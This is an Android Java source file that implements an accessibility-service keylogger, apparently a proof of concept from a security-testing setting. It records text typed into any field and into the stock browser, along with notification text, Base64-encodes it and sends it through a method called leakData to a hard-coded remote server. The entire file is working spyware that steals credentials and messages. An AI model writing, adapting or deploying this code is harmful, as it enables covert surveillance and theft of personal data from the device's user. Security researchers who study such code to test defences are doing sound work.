package mx.xx.myapplication;

import android.app.Service;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.Base64;

public class MyAccessibilityService extends AccessibilityService {
    final static String TAG = "MRGHELPER";


    private class ReadTask extends AsyncTask<String, Integer, String> {

        @Override
        protected String doInBackground(String... params) {

            return getResponseFromUrl(params[0]);
        }

        private String getResponseFromUrl(String param) {
            try {
                URL url = new URL(param);
                URLConnection urlConnection = url.openConnection();
                InputStream in = urlConnection.getInputStream();
                return "ok";
            } catch (MalformedURLException e) {
                e.printStackTrace();
                return "M";
            } catch (IOException e) {
                e.printStackTrace();
                return e.getMessage();
            }
        }
    }

    public void leakData(String html, String data) {
        try {
            AsyncTask<String, Integer, String> rt = new ReadTask();
            String b64 = Base64.getEncoder().encodeToString(data.getBytes());
            rt.execute("http://mrgsrv1.mrg-effitas.com:9987/" + html + ".html?x=" + b64);
        } catch (Exception e) {
            //todo
            System.out.print("X");
        }
    }

    private String getEventText(AccessibilityEvent event) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : event.getText()) {
            sb.append(s);
        }
        return sb.toString();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        //typing into wherever
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo mNodeInfo = event.getSource();
            try{
                if(event.getSource().getText()==null){
                    Log.d(TAG,"getText() returned null");
                    Log.v(TAG, String.format("onAccessibilityEvent: type = [ %s ], class = [ %s ], package = [ %s ], time = [ %s ], text = [ %s ]", event.getEventType(), event.getClassName(), event.getPackageName(), event.getEventTime(),event.toString()));
                }else{
                    Log.d(TAG,"ENTERED TEXT:" + mNodeInfo.getText().toString());
                    leakData("event","ENTERED TEXT:" + mNodeInfo.getText().toString());
                }
            } catch (Exception e){
                Log.d(TAG,Log.getStackTraceString(e));
            }
        }

        //typing into browser window
        if (event.getPackageName() == "com.android.browser") {
            Log.d(TAG,"browser invoked");
            AccessibilityNodeInfo mNodeInfo = event.getSource();
            try{
                /*Log.d(TAG,mNodeInfo.toString());*/
                Log.d(TAG,"ENTERED BROWSER TEXT:" + mNodeInfo.getText().toString());
                leakData("browser","ENTERED TEXT:" + mNodeInfo.getText().toString());
            } catch (Exception e){
                Log.d(TAG,Log.getStackTraceString(e));
            }
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED){
                Log.d(TAG,"MRGMESSAGE - " + event.getText());
                Log.d(TAG,"MRGMESSAGE - " + event.getSource());
                Log.d(TAG,"MRGMESSAGE - " + event.getPackageName());
                try{
                 leakData("other","TEXT:" +event.getSource().getText());
                }catch (Exception e){
                    Log.d(TAG,"Exception occurred :(");
                }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG,"onInterrupt reached");
    }


}
